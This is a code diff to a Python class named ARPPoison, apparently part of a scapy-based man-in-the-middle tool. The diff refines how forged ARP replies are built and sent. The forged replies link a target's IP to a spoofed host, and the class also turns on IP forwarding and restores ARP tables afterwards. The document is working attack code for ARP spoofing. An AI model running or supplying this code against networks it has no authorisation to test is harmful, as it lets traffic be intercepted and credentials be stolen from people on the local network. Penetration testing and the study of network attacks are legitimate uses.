@@ -1,4 +1,5 @@
 import scapy.all as scapy
+from scapy.layers.l2 import ARP, Ether
 import logging
 import time
 import os
@@ -14,7 +15,7 @@ class ARPPoison:
 
     def get_mac(self, IP):
         try:
-            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP)
+            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP)
             pkt = scapy.srp(broadcast, iface=self.iface, timeout=2)[0]
             mac = pkt[0][1].hwsrc
         except IndexError:
@@ -34,8 +35,8 @@ class ARPPoison:
 
     def poison(self, target, pretend, MAC):
         # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
-        packet = scapy.ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
-        scapy.send(packet, iface=self.iface)
+        packet = Ether(dst=MAC) / ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
+        scapy.sendp(packet, iface=self.iface)
         print(f"[ARPPoison]: Poisoning {target} as {pretend}")
 
     def ip_forward(self, enable):
@@ -47,10 +48,10 @@ class ARPPoison:
             print("[ARPPoison]: IP forwarding disabled.")
 
     def restore_tables(self, ptarget1, ptarget2, hwt1, hwt2):
-        pkt = scapy.ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
-        scapy.send(pkt, iface=self.iface)
-        pkt = scapy.ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
-        scapy.send(pkt, iface=self.iface)
+        pkt = Ether(dst=hwt1) / ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
+        scapy.sendp(pkt, iface=self.iface)
+        pkt = Ether(dst=hwt2) / ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
+        scapy.sendp(pkt, iface=self.iface)
 
     def attack(self, timer, forward, stop_event):
         self.set_mac()
